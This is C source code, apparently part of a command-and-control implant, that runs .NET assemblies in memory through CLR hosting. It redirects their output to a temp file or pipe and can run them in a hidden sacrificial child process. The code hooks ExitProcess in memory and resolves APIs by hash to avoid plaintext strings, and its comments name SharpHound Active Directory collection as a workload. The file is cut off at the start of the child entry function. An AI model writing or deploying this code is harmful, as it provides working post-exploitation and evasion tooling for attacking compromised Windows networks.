// In-memory .NET CLR hosting — DOTNET_EXEC implementation for the C agent.
//
// COM chain: CLRCreateInstance → ICLRMetaHost::GetRuntime(v4) →
//   ICLRRuntimeInfo::GetInterface(ICorRuntimeHost) → Start() →
//   GetDefaultDomain() → QI(_AppDomain) → Load_3(SAFEARRAY) →
//   _Assembly::get_EntryPoint() → _MethodInfo::Invoke_3()
//
// Output captured by redirecting Win32 stdout/stderr handles to a temp file
// before Invoke_3, then reading the file after completion.

#include "dotnet.h"
#include <windows.h>
#include <objbase.h>
#include "api_resolve.h"
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <wchar.h>

// ── GUIDs ─────────────────────────────────────────────────────────────────────

static const GUID CLSID_CLRMetaHost_ =
    {0x9280188d,0x0e8e,0x4867,{0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde}};
static const GUID IID_ICLRMetaHost_ =
    {0xd332db9e,0xb9b3,0x4125,{0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16}};
static const GUID IID_ICLRRuntimeInfo_ =
    {0xbd39d1d2,0xba2f,0x486a,{0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91}};
static const GUID CLSID_CorRuntimeHost_ =
    {0xcb2f6723,0xab3a,0x11d2,{0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};
static const GUID IID_ICorRuntimeHost_ =
    {0xcb2f6722,0xab3a,0x11d2,{0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};
static const GUID IID_AppDomain_ =
    {0x05f696dc,0x2b29,0x3663,{0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13}};

// ── COM vtable helper ─────────────────────────────────────────────────────────

// On x64 Windows all calling conventions are identical; cast vtable slot to the
// specific function type for each call site to avoid variadic UB.
static inline void** _vtbl(void *obj) { return *(void***)obj; }
#define VTBL(obj) _vtbl(obj)

// ── SafeArray / VARIANT ───────────────────────────────────────────────────────

typedef SAFEARRAY* (WINAPI *pfnSACV)(VARTYPE, LONG, ULONG);
typedef HRESULT (WINAPI *pfnSAAD)(SAFEARRAY*, void**);
typedef HRESULT (WINAPI *pfnSAUA)(SAFEARRAY*);
typedef HRESULT (WINAPI *pfnSAPE)(SAFEARRAY*, LONG*, void*);
typedef HRESULT (WINAPI *pfnSAD)(SAFEARRAY*);
typedef BSTR (WINAPI *pfnSAS)(LPCWSTR);
typedef void (WINAPI *pfnSFS)(BSTR);

static pfnSACV   g_saCreateVector;
static pfnSAAD   g_saAccessData;
static pfnSAUA   g_saUnaccessData;
static pfnSAPE   g_saPutElement;
static pfnSAD    g_saDestroy;
static pfnSAS    g_sysAllocString;
static pfnSFS    g_sysFreeString;

static int load_oleaut32(void) {
    HMODULE h = LoadLibraryA("oleaut32.dll");
    if (!h) return 0;
    g_saCreateVector  = (pfnSACV)GetProcAddress(h, "SafeArrayCreateVector");
    g_saAccessData    = (pfnSAAD)GetProcAddress(h, "SafeArrayAccessData");
    g_saUnaccessData  = (pfnSAUA)GetProcAddress(h, "SafeArrayUnaccessData");
    g_saPutElement    = (pfnSAPE)GetProcAddress(h, "SafeArrayPutElement");
    g_saDestroy       = (pfnSAD) GetProcAddress(h, "SafeArrayDestroy");
    g_sysAllocString  = (pfnSAS) GetProcAddress(h, "SysAllocString");
    g_sysFreeString   = (pfnSFS) GetProcAddress(h, "SysFreeString");
    return g_saCreateVector && g_saAccessData && g_saUnaccessData &&
           g_saPutElement && g_saDestroy && g_sysAllocString && g_sysFreeString;
}

// Build SAFEARRAY(VT_UI1) from raw bytes
static SAFEARRAY* bytes_to_sa(const uint8_t *data, ULONG len) {
    SAFEARRAY *sa = g_saCreateVector(VT_UI1, 0, len);
    if (!sa) return NULL;
    void *pv = NULL;
    g_saAccessData(sa, &pv);
    if (pv) memcpy(pv, data, len);
    g_saUnaccessData(sa);
    return sa;
}

// Build the Invoke_3 params SAFEARRAY: SAFEARRAY(VT_VARIANT, 1 element)
// where element[0] = VT_ARRAY|VT_BSTR wrapping a SAFEARRAY(VT_BSTR) of args.
// On x64 a VARIANT is 16 bytes.
typedef struct { VARTYPE vt; WORD r1,r2,r3; ULONG_PTR data; } OleVar16;

static SAFEARRAY* args_to_param_sa(const char *args) {
    // Split args by space (simple split; quoted args not handled at C level)
    char *copy = args && args[0] ? _strdup(args) : NULL;
    int n = 0;
    char *parts[256] = {0};
    if (copy) {
        char *tok = strtok(copy, " ");
        while (tok && n < 256) { parts[n++] = tok; tok = strtok(NULL, " "); }
    }

    // inner = SAFEARRAY(VT_BSTR, n elements)
    SAFEARRAY *inner = g_saCreateVector(VT_BSTR, 0, n);
    if (!inner) { free(copy); return NULL; }
    for (int i = 0; i < n; i++) {
        int wlen = MultiByteToWideChar(CP_UTF8, 0, parts[i], -1, NULL, 0);
        WCHAR *ws = (WCHAR*)calloc(wlen + 1, sizeof(WCHAR));
        MultiByteToWideChar(CP_UTF8, 0, parts[i], -1, ws, wlen);
        BSTR bstr = g_sysAllocString(ws);
        free(ws);
        LONG idx = (LONG)i;
        g_saPutElement(inner, &idx, bstr);
        g_sysFreeString(bstr);
    }
    free(copy);

    // outer = SAFEARRAY(VT_VARIANT, 1 element)
    SAFEARRAY *outer = g_saCreateVector(VT_VARIANT, 0, 1);
    if (!outer) { g_saDestroy(inner); return NULL; }
    OleVar16 elem;
    memset(&elem, 0, sizeof(elem));
    elem.vt   = (VARTYPE)(VT_ARRAY | VT_BSTR); // 0x2008
    elem.data = (ULONG_PTR)inner;
    LONG idx0 = 0;
    // SafeArrayPutElement deep-copies: inner ownership transfers into outer element
    g_saPutElement(outer, &idx0, &elem);
    g_saDestroy(inner); // SafeArrayPutElement deep-copied inner via VariantCopy
    return outer;
}

// ── Stdout redirect to temp file ──────────────────────────────────────────────

typedef int  (WINAPI *pfnOSFH)(intptr_t, int);
typedef int  (WINAPI *pfnDup) (int);
typedef int  (WINAPI *pfnDup2)(int, int);
typedef int  (WINAPI *pfnClose)(int);
typedef FILE*(WINAPI *pfnFdopen)(int, const char*);

static HANDLE redirect_stdout(WCHAR *tmpPath, HANDLE *origOut, HANDLE *origErr,
                               int *origFd1, int *origFd2) {
    *origFd1 = -1; *origFd2 = -1;
    *origOut = GetStdHandle(STD_OUTPUT_HANDLE);
    *origErr = GetStdHandle(STD_ERROR_HANDLE);

    // Create temp file
    WCHAR tmpDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpDir);
    GetTempFileNameW(tmpDir, L"clr", 0, tmpPath);

    HANDLE fh = CreateFileW(tmpPath,
        GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;

    SetStdHandle(STD_OUTPUT_HANDLE, fh);
    SetStdHandle(STD_ERROR_HANDLE,  fh);

    // Also redirect CRT fd 1/2 for assemblies that use the CRT console
    HMODULE hCRT = LoadLibraryA("ucrtbase.dll");
    if (!hCRT) hCRT = LoadLibraryA("msvcrt.dll");
    if (hCRT) {
        pfnOSFH pOSFH  = (pfnOSFH) GetProcAddress(hCRT, "_open_osfhandle");
        pfnDup  pDup   = (pfnDup)  GetProcAddress(hCRT, "_dup");
        pfnDup2 pDup2  = (pfnDup2) GetProcAddress(hCRT, "_dup2");
        pfnClose pClose= (pfnClose)GetProcAddress(hCRT, "_close");
        if (pOSFH && pDup2) {
            if (pDup) { *origFd1 = pDup(1); *origFd2 = pDup(2); }
            // Duplicate fh so CRT owns its copy
            HANDLE fhDup = INVALID_HANDLE_VALUE;
            DuplicateHandle(GetCurrentProcess(), fh,
                            GetCurrentProcess(), &fhDup,
                            0, FALSE, DUPLICATE_SAME_ACCESS);
            if (fhDup != INVALID_HANDLE_VALUE) {
                int pipeFd = pOSFH((intptr_t)fhDup, 0x8001); // _O_WRONLY|_O_BINARY
                if (pipeFd >= 0) {
                    pDup2(pipeFd, 1);
                    pDup2(pipeFd, 2);
                    if (pClose) pClose(pipeFd);
                }
            }
        }
    }
    return fh;
}

static void restore_stdout(HANDLE origOut, HANDLE origErr, int origFd1, int origFd2) {
    SetStdHandle(STD_OUTPUT_HANDLE, origOut);
    SetStdHandle(STD_ERROR_HANDLE,  origErr);
    HMODULE hCRT = LoadLibraryA("ucrtbase.dll");
    if (!hCRT) hCRT = LoadLibraryA("msvcrt.dll");
    if (hCRT) {
        pfnDup2  pDup2  = (pfnDup2) GetProcAddress(hCRT, "_dup2");
        pfnClose pClose = (pfnClose)GetProcAddress(hCRT, "_close");
        if (pDup2 && pClose) {
            if (origFd1 >= 0) { pDup2(origFd1, 1); pClose(origFd1); }
            else                { pClose(1); }
            if (origFd2 >= 0) { pDup2(origFd2, 2); pClose(origFd2); }
            else                { pClose(2); }
        }
    }
}

static char* read_temp_file(HANDLE fh, WCHAR *tmpPath) {
    DWORD size = GetFileSize(fh, NULL);
    if (size == 0 || size == INVALID_FILE_SIZE) {
        CloseHandle(fh);
        DeleteFileW(tmpPath);
        return _strdup("(no output)");
    }
    char *buf = (char*)malloc(size + 1);
    if (!buf) { CloseHandle(fh); DeleteFileW(tmpPath); return _strdup("(malloc fail)"); }
    SetFilePointer(fh, 0, NULL, FILE_BEGIN);
    DWORD rd = 0;
    ReadFile(fh, buf, size, &rd, NULL);
    buf[rd] = '\0';
    CloseHandle(fh);
    DeleteFileW(tmpPath);
    return buf;
}

// ── ExitProcess hook: redirect to ExitThread so managed Environment.Exit()
//    doesn't kill the host process.  Install before Invoke_3, remove after. ──

static BYTE   g_ep_orig[12];
static BYTE   g_ep_jmp[12];
static void  *g_ep_addr = NULL;
static LONG   g_ep_hooked = 0;

static void WINAPI ep_stub(UINT code) { ExitThread((DWORD)code); }

static void install_exit_hook(void) {
    if (InterlockedCompareExchange(&g_ep_hooked, 1, 0) != 0) return;
    /* Patch RtlExitUserProcess/ExitProcess via hash — no plaintext module/function strings */
    g_ep_addr = resolve_fn(0x98D2A435u); /* RtlExitUserProcess */
    if (!g_ep_addr)
        g_ep_addr = resolve_fn(0x90C612CEu); /* ExitProcess */
    if (!g_ep_addr) return;
    void *stub = (void*)ep_stub;
    // MOV RAX, stub_addr (10 bytes) + JMP RAX (2 bytes) = 12 bytes
    g_ep_jmp[0] = 0x48; g_ep_jmp[1] = 0xB8;
    memcpy(g_ep_jmp + 2, &stub, 8);
    g_ep_jmp[10] = 0xFF; g_ep_jmp[11] = 0xE0;
    DWORD old = 0;
    VirtualProtect(g_ep_addr, 12, PAGE_EXECUTE_READWRITE, &old);
    memcpy(g_ep_orig, g_ep_addr, 12);
    memcpy(g_ep_addr, g_ep_jmp, 12);
    VirtualProtect(g_ep_addr, 12, old, &old);
}

static void remove_exit_hook(void) {
    if (InterlockedCompareExchange(&g_ep_hooked, 0, 1) != 1) return;
    if (!g_ep_addr) return;
    DWORD old = 0;
    VirtualProtect(g_ep_addr, 12, PAGE_EXECUTE_READWRITE, &old);
    memcpy(g_ep_addr, g_ep_orig, 12);
    VirtualProtect(g_ep_addr, 12, old, &old);
}

// ── Thread wrapper: runs Invoke_3 in a separate thread so that ExitThread()
//    (triggered by our ExitProcess hook) only kills the CLR thread, not the
//    entire agent process. ───────────────────────────────────────────────────

typedef struct {
    void      *pEP;
    SAFEARRAY *saParams;
    HRESULT    hr;
} InvokeWork;

// Reflection invokes an async managed entry point as a normal method.  When
// Main returns Task, MethodInfo.Invoke returns as soon as the first await is
// reached; killing the CLR child at that point truncates SharpHound after its
// schema discovery and no ZIP is ever written.  Wait for the returned Task
// through its COM dispatch surface before reporting the task complete.
static const GUID IID_IDispatch_ =
    {0x00020400,0x0000,0x0000,{0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}};
static const GUID IID_NULL_ =
    {0x00000000,0x0000,0x0000,{0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}};

typedef HRESULT (WINAPI *pfnGetIDsOfNames)(void*, const GUID*, LPOLESTR*,
                                           UINT, LCID, DISPID*);
typedef HRESULT (WINAPI *pfnDispatchInvoke)(void*, DISPID, const GUID*, LCID,
                                            WORD, DISPPARAMS*, VARIANT*,
                                            EXCEPINFO*, UINT*);
typedef ULONG (WINAPI *pfnRelease)(void*);

// Invoke one public parameterless method on a managed object exposed through
// a COM callable wrapper.  The result is returned as a normal VARIANT so the
// caller can chain GetAwaiter/GetResult when Wait is not exposed.
static HRESULT dispatch_noargs(void *object, const WCHAR *method,
                               OleVar16 *result) {
    if (!object || !method || !result) return E_INVALIDARG;
    memset(result, 0, sizeof(*result));
    VariantInit((VARIANT*)result);

    void *disp = NULL;
    typedef HRESULT (WINAPI *pfnQI)(void*, const GUID*, void**);
    HRESULT hr = ((pfnQI*)VTBL(object))[0](object, &IID_IDispatch_, &disp);
    if (FAILED(hr) || !disp) return FAILED(hr) ? hr : E_NOINTERFACE;

    LPOLESTR name = (LPOLESTR)method;
    DISPID dispid = DISPID_UNKNOWN;
    hr = ((pfnGetIDsOfNames*)VTBL(disp))[5](disp, &IID_NULL_, &name, 1,
                                           LOCALE_SYSTEM_DEFAULT, &dispid);
    if (SUCCEEDED(hr)) {
        DISPPARAMS params;
        memset(&params, 0, sizeof(params));
        EXCEPINFO excep;
        memset(&excep, 0, sizeof(excep));
        UINT arg_err = 0;
        hr = ((pfnDispatchInvoke*)VTBL(disp))[6](disp, dispid, &IID_NULL_,
                                                  LOCALE_SYSTEM_DEFAULT,
                                                  DISPATCH_METHOD, &params,
                                                  (VARIANT*)result, &excep,
                                                  &arg_err);
        if (excep.bstrSource && g_sysFreeString) g_sysFreeString(excep.bstrSource);
        if (excep.bstrDescription && g_sysFreeString) g_sysFreeString(excep.bstrDescription);
        if (excep.bstrHelpFile && g_sysFreeString) g_sysFreeString(excep.bstrHelpFile);
    }
    ((pfnRelease*)VTBL(disp))[2](disp);
    return hr;
}

// Return 1 when a Task was awaited, 0 for a synchronous/non-COM return value,
// and -1 when a Task was detected but waiting failed.
static int await_managed_task(OleVar16 *ret) {
    if (!ret || (ret->vt != VT_UNKNOWN && ret->vt != VT_DISPATCH) || !ret->data)
        return 0;

    OleVar16 ignored;
    HRESULT hr = dispatch_noargs((void*)ret->data, L"Wait", &ignored);
    VariantClear((VARIANT*)&ignored);
    if (SUCCEEDED(hr)) return 1;

    // Some runtimes expose GetAwaiter but not Task.Wait through IDispatch.
    // Calling GetResult also propagates an exception from the async entry
    // point instead of letting the child exit while work is still pending.
    OleVar16 awaiter;
    hr = dispatch_noargs((void*)ret->data, L"GetAwaiter", &awaiter);
    if (FAILED(hr)) {
        VariantClear((VARIANT*)&awaiter);
        return 0; // A synchronous method may legitimately return a COM object.
    }
    if ((awaiter.vt == VT_UNKNOWN || awaiter.vt == VT_DISPATCH) && awaiter.data) {
        OleVar16 result;
        HRESULT result_hr = dispatch_noargs((void*)awaiter.data, L"GetResult", &result);
        VariantClear((VARIANT*)&result);
        VariantClear((VARIANT*)&awaiter);
        return SUCCEEDED(result_hr) ? 1 : -1;
    }
    VariantClear((VARIANT*)&awaiter);
    return -1;
}

static DWORD WINAPI invoke_thread(LPVOID param) {
    InvokeWork *w = (InvokeWork*)param;
    typedef HRESULT (WINAPI *pfnInv3)(void*, OleVar16*, SAFEARRAY*, OleVar16*);
    OleVar16 objVar, retVar;
    memset(&objVar, 0, sizeof(objVar));
    memset(&retVar, 0, sizeof(retVar));
    w->hr = ((pfnInv3*)VTBL(w->pEP))[37](w->pEP, &objVar, w->saParams, &retVar);
    if (SUCCEEDED(w->hr)) {
        int awaited = await_managed_task(&retVar);
        if (awaited < 0) w->hr = E_FAIL;
    }
    VariantClear((VARIANT*)&retVar);
    return 0;
}

// ── Main entry point ──────────────────────────────────────────────────────────

char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, int child_mode) {
    if (!asm_bytes || asm_len < 2) return _strdup("dotnet_exec: empty payload");
    if (!load_oleaut32()) return _strdup("dotnet_exec: oleaut32.dll load failed");

    // Load CLRCreateInstance
    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
    if (!hMscoree) return _strdup("dotnet_exec: mscoree.dll not found");
    typedef HRESULT (WINAPI *pfnCLRCI)(const GUID*, const GUID*, void**);
    pfnCLRCI clrCI = (pfnCLRCI)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!clrCI) return _strdup("dotnet_exec: CLRCreateInstance not found");

    // ── CLRCreateInstance → ICLRMetaHost ─────────────────────────────────────
    void *pMetaHost = NULL;
    HRESULT hr = clrCI(&CLSID_CLRMetaHost_, &IID_ICLRMetaHost_, &pMetaHost);
    if (FAILED(hr) || !pMetaHost) {
        char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: CLRCreateInstance hr=0x%08lX",(long)hr);
        return _strdup(buf);
    }

    // ── GetRuntime("v4.0.30319") → ICLRRuntimeInfo ───────────────────────────
    typedef HRESULT (WINAPI *pfnGR)(void*, LPCWSTR, const GUID*, void**);
    void *pRuntimeInfo = NULL;
    hr = ((pfnGR*)VTBL(pMetaHost))[3](pMetaHost, L"v4.0.30319",
                                      &IID_ICLRRuntimeInfo_, &pRuntimeInfo);
    if (FAILED(hr) || !pRuntimeInfo) {
        char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: GetRuntime hr=0x%08lX",(long)hr);
        return _strdup(buf);
    }

    // ── GetInterface(ICorRuntimeHost) ────────────────────────────────────────
    typedef HRESULT (WINAPI *pfnGI)(void*, const GUID*, const GUID*, void**);
    void *pCorHost = NULL;
    hr = ((pfnGI*)VTBL(pRuntimeInfo))[9](pRuntimeInfo,
                                          &CLSID_CorRuntimeHost_,
                                          &IID_ICorRuntimeHost_,
                                          &pCorHost);
    if (FAILED(hr) || !pCorHost) {
        char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: GetInterface hr=0x%08lX",(long)hr);
        return _strdup(buf);
    }

    // ── ICorRuntimeHost::Start() ─────────────────────────────────────────────
    typedef HRESULT (WINAPI *pfnS)(void*);
    hr = ((pfnS*)VTBL(pCorHost))[10](pCorHost);
    if (FAILED(hr) && hr != (HRESULT)0x00000001 /*S_FALSE*/) {
        char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: Start hr=0x%08lX",(long)hr);
        return _strdup(buf);
    }

    // ── GetDefaultDomain → QI _AppDomain ────────────────────────────────────
    typedef HRESULT (WINAPI *pfnGDD)(void*, IUnknown**);
    IUnknown *pDomThunk = NULL;
    hr = ((pfnGDD*)VTBL(pCorHost))[13](pCorHost, &pDomThunk);
    if (FAILED(hr) || !pDomThunk) {
        char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: GetDefaultDomain hr=0x%08lX",(long)hr);
        return _strdup(buf);
    }

    typedef HRESULT (WINAPI *pfnQI)(void*, const GUID*, void**);
    void *pAppDomain = NULL;
    hr = ((pfnQI*)VTBL(pDomThunk))[0](pDomThunk, &IID_AppDomain_, &pAppDomain);
    if (FAILED(hr) || !pAppDomain) {
        char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: QI _AppDomain hr=0x%08lX",(long)hr);
        return _strdup(buf);
    }

    // ── Build SafeArray from assembly bytes ──────────────────────────────────
    SAFEARRAY *saAsm = bytes_to_sa(asm_bytes, (ULONG)asm_len);
    if (!saAsm) return _strdup("dotnet_exec: bytes_to_sa failed");

    // ── AppDomain.Load_3(saAsm) → _Assembly ─────────────────────────────────
    typedef HRESULT (WINAPI *pfnLoad3)(void*, SAFEARRAY*, void**);
    void *pAssembly = NULL;
    // Try vtbl[44] first (CLR 4.x), fall back to vtbl[45]
    hr = ((pfnLoad3*)VTBL(pAppDomain))[44](pAppDomain, saAsm, &pAssembly);
    if (FAILED(hr) || !pAssembly) {
        pAssembly = NULL;
        hr = ((pfnLoad3*)VTBL(pAppDomain))[45](pAppDomain, saAsm, &pAssembly);
    }
    if (FAILED(hr) || !pAssembly) {
        char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: Load_3 hr=0x%08lX",(long)hr);
        return _strdup(buf);
    }

    // ── _Assembly::get_EntryPoint → _MethodInfo ──────────────────────────────
    typedef HRESULT (WINAPI *pfnGEP)(void*, void**);
    void *pEP = NULL;
    hr = ((pfnGEP*)VTBL(pAssembly))[16](pAssembly, &pEP);
    if (FAILED(hr) || !pEP) {
        char buf[64]; snprintf(buf,sizeof(buf),"dotnet_exec: get_EntryPoint hr=0x%08lX",(long)hr);
        return _strdup(buf);
    }

    // ── Build args SAFEARRAY ─────────────────────────────────────────────────
    SAFEARRAY *saParams = args_to_param_sa(args ? args : "");
    if (!saParams) saParams = g_saCreateVector(VT_VARIANT, 0, 0);

    // ── Redirect stdout: temp file (normal) or use inherited pipe (child) ────────
    WCHAR tmpPath[MAX_PATH] = {0};
    HANDLE origOut = INVALID_HANDLE_VALUE, origErr = INVALID_HANDLE_VALUE;
    int origFd1 = -1, origFd2 = -1;
    HANDLE fhTmp = INVALID_HANDLE_VALUE;

    if (child_mode) {
        // Stdout is already the pipe; redirect stderr to it too.
        fhTmp = GetStdHandle(STD_OUTPUT_HANDLE);
        SetStdHandle(STD_ERROR_HANDLE, fhTmp);
        HMODULE hCRT = LoadLibraryA("ucrtbase.dll");
        if (!hCRT) hCRT = LoadLibraryA("msvcrt.dll");
        if (hCRT) {
            pfnOSFH pOSFH  = (pfnOSFH) GetProcAddress(hCRT, "_open_osfhandle");
            pfnDup2 pDup2  = (pfnDup2) GetProcAddress(hCRT, "_dup2");
            pfnClose pClose= (pfnClose)GetProcAddress(hCRT, "_close");
            if (pOSFH && pDup2 && pClose) {
                HANDLE fhDup = INVALID_HANDLE_VALUE;
                DuplicateHandle(GetCurrentProcess(), fhTmp,
                                GetCurrentProcess(), &fhDup, 0, FALSE, DUPLICATE_SAME_ACCESS);
                if (fhDup != INVALID_HANDLE_VALUE) {
                    int fd = pOSFH((intptr_t)fhDup, 0x8001);
                    if (fd >= 0) { pDup2(fd, 2); pClose(fd); }
                }
            }
        }
    } else {
        fhTmp = redirect_stdout(tmpPath, &origOut, &origErr, &origFd1, &origFd2);
        if (fhTmp != INVALID_HANDLE_VALUE) {
            SetStdHandle(STD_OUTPUT_HANDLE, fhTmp);
            SetStdHandle(STD_ERROR_HANDLE,  fhTmp);
        }
    }

    // ── Invoke_3 in a thread (ExitThread hook only needed in normal mode) ────────
    InvokeWork work = { pEP, saParams, S_OK };
    if (!child_mode) install_exit_hook();
    HANDLE ht = CreateThread(NULL, 0, invoke_thread, &work, 0, NULL);
    if (ht) {
        /* The parent process owns the bounded timeout; allow long-running
         * directory-wide SharpHound collection to finish. */
        WaitForSingleObject(ht, 900000);
        CloseHandle(ht);
    } else {
        typedef HRESULT (WINAPI *pfnInv3)(void*, OleVar16*, SAFEARRAY*, OleVar16*);
        OleVar16 objVar, retVar;
        memset(&objVar, 0, sizeof(objVar));
        memset(&retVar, 0, sizeof(retVar));
        work.hr = ((pfnInv3*)VTBL(pEP))[37](pEP, &objVar, saParams, &retVar);
    }
    if (!child_mode) remove_exit_hook();
    hr = work.hr;

    if (child_mode) {
        FlushFileBuffers(fhTmp);
        ExitProcess(0);
        return NULL; // unreachable
    }

    // ── Restore stdout ───────────────────────────────────────────────────────
    restore_stdout(origOut, origErr, origFd1, origFd2);

    // ── Read captured output ─────────────────────────────────────────────────
    char *output = NULL;
    if (fhTmp != INVALID_HANDLE_VALUE) {
        FlushFileBuffers(fhTmp);
        output = read_temp_file(fhTmp, tmpPath);
    }

    if (!output || !output[0]) {
        free(output);
        if (hr == (HRESULT)0x80131604)
            return _strdup("[!] assembly threw an exception");
        if (FAILED(hr)) {
            char buf[64]; snprintf(buf,sizeof(buf),"[!] Invoke_3 hr=0x%08lX",(long)hr);
            return _strdup(buf);
        }
        return _strdup("(no output captured)");
    }
    return output;
}

// ── Fork-and-run: spawn a sacrificial child process to host the CLR ───────────

static void fork_write_all(HANDLE h, const void *data, DWORD n) {
    DWORD off = 0, wr = 0;
    while (off < n) {
        if (!WriteFile(h, (const char*)data + off, n - off, &wr, NULL) || wr == 0) break;
        off += wr;
    }
}

static void fork_write_le32(HANDLE h, DWORD v) {
    BYTE b[4] = { (BYTE)(v), (BYTE)(v>>8), (BYTE)(v>>16), (BYTE)(v>>24) };
    fork_write_all(h, b, 4);
}

static void append_output_marker(char **output, size_t *out_len, size_t *out_cap,
                                 const char *marker) {
    if (!output || !out_len || !out_cap || !marker) return;
    size_t marker_len = strlen(marker);
    char *tmp = (char*)realloc(*output, *out_len + marker_len + 1);
    if (!tmp) return;
    *output = tmp;
    memcpy(*output + *out_len, marker, marker_len);
    *out_len += marker_len;
    (*output)[*out_len] = '\0';
}

typedef struct {
    HANDLE         h;
    const uint8_t *asm_bytes;
    size_t         asm_len;
    const char    *args;
} ForkWriteWork;

static DWORD WINAPI fork_write_thread(LPVOID p) {
    ForkWriteWork *w = (ForkWriteWork*)p;
    size_t args_len = w->args ? strlen(w->args) : 0;
    fork_write_le32(w->h, (DWORD)args_len);
    if (args_len > 0) fork_write_all(w->h, w->args, (DWORD)args_len);
    fork_write_le32(w->h, (DWORD)w->asm_len);
    if (w->asm_len > 0) fork_write_all(w->h, w->asm_bytes, (DWORD)w->asm_len);
    CloseHandle(w->h);
    free(w);
    return 0;
}

char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *args, int timeout_sec) {
    WCHAR exe[MAX_PATH+1] = {0};
    if (!GetModuleFileNameW(NULL, exe, MAX_PATH))
        return dotnet_exec(asm_bytes, asm_len, args, 0);

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE asm_rd, asm_wr, out_rd, out_wr;

    if (!CreatePipe(&asm_rd, &asm_wr, &sa, 0))
        return dotnet_exec(asm_bytes, asm_len, args, 0);
    SetHandleInformation(asm_wr, HANDLE_FLAG_INHERIT, 0);

    if (!CreatePipe(&out_rd, &out_wr, &sa, 0)) {
        CloseHandle(asm_rd); CloseHandle(asm_wr);
        return dotnet_exec(asm_bytes, asm_len, args, 0);
    }
    SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);

    SetEnvironmentVariableA("__ENDGAME_CLR_CHILD", "1");

    STARTUPINFOW si = {0};
    si.cb = sizeof(STARTUPINFOW);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = 0;
    si.hStdInput = asm_rd; si.hStdOutput = out_wr; si.hStdError = out_wr;

    PROCESS_INFORMATION pi = {0};
    BOOL ok = CreateProcessW(exe, NULL, NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    SetEnvironmentVariableA("__ENDGAME_CLR_CHILD", NULL);
    CloseHandle(asm_rd); CloseHandle(out_wr);

    if (!ok) {
        CloseHandle(asm_wr); CloseHandle(out_rd);
        return dotnet_exec(asm_bytes, asm_len, args, 0);
    }

    ForkWriteWork *fw = (ForkWriteWork*)malloc(sizeof(ForkWriteWork));
    if (fw) {
        fw->h = asm_wr; fw->asm_bytes = asm_bytes;
        fw->asm_len = asm_len; fw->args = args;
        HANDLE wt = CreateThread(NULL, 0, fork_write_thread, fw, 0, NULL);
        if (wt) CloseHandle(wt);
        else { CloseHandle(asm_wr); free(fw); }
    } else {
        CloseHandle(asm_wr);
    }

    char  *output  = NULL;
    size_t out_len = 0, out_cap = 0;
    BYTE   buf[8192];
    DWORD timeout_ms = (timeout_sec >= 60 && timeout_sec <= 1800)
                     ? (DWORD)(timeout_sec * 1000) : 60000;
    DWORD  deadline = GetTickCount() + timeout_ms;
    int timed_out = 0;

    while (GetTickCount() < deadline) {
        DWORD avail = 0;
        if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            DWORD nr = 0;
            ReadFile(out_rd, buf, min(avail, (DWORD)sizeof(buf)), &nr, NULL);
            if (nr > 0) {
                if (out_len + nr >= out_cap) {
                    out_cap = out_len + nr + 4096;
                    char *tmp = (char*)realloc(output, out_cap + 1);
                    if (!tmp) break;
                    output = tmp;
                }
                memcpy(output + out_len, buf, nr);
                out_len += nr;
            }
        } else {
            if (WaitForSingleObject(pi.hProcess, 50) != WAIT_TIMEOUT) {
                while (1) {
                    avail = 0;
                    if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL) || avail == 0) break;
                    DWORD nr = 0;
                    ReadFile(out_rd, buf, min(avail, (DWORD)sizeof(buf)), &nr, NULL);
                    if (nr == 0) break;
                    if (out_len + nr >= out_cap) {
                        out_cap = out_len + nr + 4096;
                        char *tmp = (char*)realloc(output, out_cap + 1);
                        if (!tmp) break;
                        output = tmp;
                    }
                    memcpy(output + out_len, buf, nr);
                    out_len += nr;
                }
                break;
            }
        }
    }

    CloseHandle(out_rd);
    if (GetTickCount() >= deadline) {
        timed_out = 1;
        TerminateProcess(pi.hProcess, 1);
        char marker[96];
        snprintf(marker, sizeof(marker), "\n[!] fork-and-run timeout (%lus)",
                 (unsigned long)(timeout_ms / 1000));
        append_output_marker(&output, &out_len, &out_cap, marker);
    }
    WaitForSingleObject(pi.hProcess, 5000);
    if (!timed_out) {
        DWORD exit_code = 0;
        if (GetExitCodeProcess(pi.hProcess, &exit_code) && exit_code != 0) {
            char marker[96];
            snprintf(marker, sizeof(marker),
                     "\n[!] fork-and-run child exited with code %lu",
                     (unsigned long)exit_code);
            append_output_marker(&output, &out_len, &out_cap, marker);
        }
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);

    if (!output || out_len == 0) { free(output); return _strdup("(no output from child)"); }
    output[out_len] = '\0';
    return output;
}

// ── Child entry: read protocol from stdin, run CLR via pipe, exit ─────────────

void clr_child_run(void) {
